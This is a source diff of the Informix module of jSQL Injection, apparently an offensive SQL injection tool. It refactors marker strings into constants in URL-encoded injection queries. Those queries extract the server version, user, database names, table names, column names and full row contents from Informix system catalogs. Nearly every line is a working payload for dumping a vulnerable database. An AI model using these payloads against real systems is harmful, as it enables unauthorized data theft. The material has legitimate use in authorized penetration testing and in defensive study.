@@ -1,5 +1,9 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -8,18 +12,18 @@ import com.jsql.model.bean.database.Database;
 import com.jsql.model.bean.database.Table;
 import com.jsql.util.StringUtil;
 
-public class InformixVendor extends AbstractVendor {
+public class InformixVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
-            "SELECT+trim(DBINFO('version','full')||'%04'||DBSERVERNAME||'%04'||USER||'%01%03%03%07')r+FROM+TABLE(SET{1})";
+            "SELECT+trim(DBINFO('version','full')||'"+ SEPARATOR_SQL +"'||DBSERVERNAME||'"+ SEPARATOR_SQL +"'||USER||'"+ TRAIL_SQL +"')r+FROM+TABLE(SET{1})";
     }
 
     @Override
     public String getSqlDatabases() {
         return
-            "select+rr||'%01%03%03%07'+r+from(select'%04'||trim(t.name)||'%050%04'rr+" +
+            "select+rr||'"+ TRAIL_SQL +"'+r+from(select'"+ SEPARATOR_SQL +"'||trim(t.name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+name+from+sysdatabases)t,(select+distinct+name+from+sysdatabases)t1+" +
             "where+t.name>=t1.name+" +
             "group+by+1{limit})a";
@@ -28,7 +32,7 @@ public class InformixVendor extends AbstractVendor {
     @Override
     public String getSqlTables(Database database) {
         return
-            "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.tabname)||'%050%04'rr+" +
+            "select+rr||'"+ TRAIL_SQL +"'+r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.tabname)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+tabname+from+" + database + ":systables)t,(select+distinct+tabname+from+" + database + ":systables)t1+" +
             "where+t.tabname>=t1.tabname+" +
             "group+by+1{limit})a";
@@ -37,7 +41,7 @@ public class InformixVendor extends AbstractVendor {
     @Override
     public String getSqlColumns(Table table) {
         return
-            "select+rr||'%01%03%03%07'+r+from(select+'%04'||trim(t.colname)||'%050%04'rr+" +
+            "select+rr||'"+ TRAIL_SQL +"'+r+from(select+'"+ SEPARATOR_SQL +"'||trim(t.colname)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t,(select+distinct+colname+from+" + table.getParent() + ":syscolumns+c+join+" + table.getParent() + ":systables+t+on+c.tabid=t.tabid+where+tabname='" + table + "')t1+" +
             "where+t.colname>=t1.colname+" +
             "group+by+1{limit})a";
@@ -51,7 +55,7 @@ public class InformixVendor extends AbstractVendor {
         formatListColumn = "trim(nvl(" + formatListColumn + ",''))";
 
         return
-            "select+rr||'%01%03%03%07'+r+from(select'%04'||trim(t.s)||'%050%04'rr+" +
+            "select+rr||'"+ TRAIL_SQL +"'+r+from(select'"+ SEPARATOR_SQL +"'||trim(t.s)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ":" + table + ")t1+" +
             "where+t.s>=t1.s+" +
             "group+by+1{limit})a";
